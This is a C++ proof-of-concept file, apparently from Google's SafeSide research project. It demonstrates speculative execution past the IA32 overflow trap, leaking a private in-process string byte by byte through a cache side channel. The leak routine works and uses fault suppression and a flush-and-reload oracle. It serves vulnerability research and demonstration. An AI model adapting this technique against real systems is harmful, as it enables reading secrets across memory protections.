/*
 * Copyright 2019 Google LLC
 *
 * Licensed under both the 3-Clause BSD License and the GPLv2, found in the
 * LICENSE and LICENSE.GPL-2.0 files, respectively, in the root directory.
 *
 * SPDX-License-Identifier: BSD-3-Clause OR GPL-2.0
 */

/**
 * Demonstrates speculation over the overflow trap (#OF) on IA32 CPUs.
 * Since the overflow trap can be invoked only by the INTO instruction and that
 * instruction opcode exists only on IA32, this vulnerability cannot be
 * demonstrated on X64 or AMD64.
 * We cause the overflow trap by making the OF flag in EFLAGS being set.
 * Afterwards we yield the INTO instruction and fetch from the address. Even
 * though the INTO instruction triggers OF (which is ensured by the dead code
 * guard), the next load is speculatively performed.
 **/

#include "compiler_specifics.h"

#if !SAFESIDE_LINUX && !SAFESIDE_MAC
#  error Unsupported OS. Linux or MacOS required.
#endif

#if !SAFESIDE_IA32
#  error Unsupported architecture. IA32 required.
#endif

#include <array>
#include <climits>
#include <cstring>
#include <iostream>

#include <signal.h>

#include "cache_sidechannel.h"
#include "instr.h"
#include "meltdown_local_content.h"
#include "local_content.h"

static char LeakByte(const char *data, size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();

  for (int run = 0;; ++run) {
    size_t safe_offset = run % strlen(data);
    sidechannel.FlushOracle();

    for (int i = 0; i < 1000; ++i) {
      const char *safe_address = reinterpret_cast<const char *>(oracle.data() +
          static_cast<uint8_t>(data[safe_offset]));

      // Succeeds.
      SupposedlySafeOffsetAndDereference(safe_address, 0);

      const char *unsafe_address = reinterpret_cast<const char *>(
          oracle.data() + static_cast<uint8_t>(data[offset]));

      bool firstbit = reinterpret_cast<ptrdiff_t>(unsafe_address) & 0x80000000;
      int shift = INT_MAX - 2 * firstbit * INT_MAX;
      // This crashes by the OF trap being raised.
      SupposedlySafeOffsetAndDereference(unsafe_address + shift, -shift);

      std::cout << "Dead code. Must not be printed." << std::endl;

      // The exit call must not be unconditional, otherwise clang would
      // optimize out everything that follows it and the linking would fail.
      if (strlen(public_data) != 0) {
        exit(EXIT_FAILURE);
      }

      // SIGSEGV signal handler moves the instruction pointer to this label.
#if SAFESIDE_LINUX
      asm volatile("afterspeculation:");
#elif SAFESIDE_MAC
      asm volatile("_afterspeculation:");
#else
#  error Unsupported OS.
#endif
    }

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(data[safe_offset]);

    if (result.first) {
      return result.second;
    }

    if (run > 100000000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
#if SAFESIDE_LINUX
  OnSignalMoveRipToAfterspeculation(SIGSEGV);
#elif SAFESIDE_MAC
  OnSignalMoveRipToAfterspeculation(SIGFPE);
#else
#  error Unsupported OS.
#endif
  std::cout << "On Intel this example might take many hours." << std::endl
            << "First character should be leaked within two hours." << std::endl
            << "On AMD this example should take about 1 second." << std::endl;
  std::cout << "Leaking the string: ";
  std::cout.flush();
  const size_t private_offset = private_data - public_data;
  for (size_t i = 0; i < strlen(private_data); ++i) {
    std::cout << LeakByte(public_data, private_offset + i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
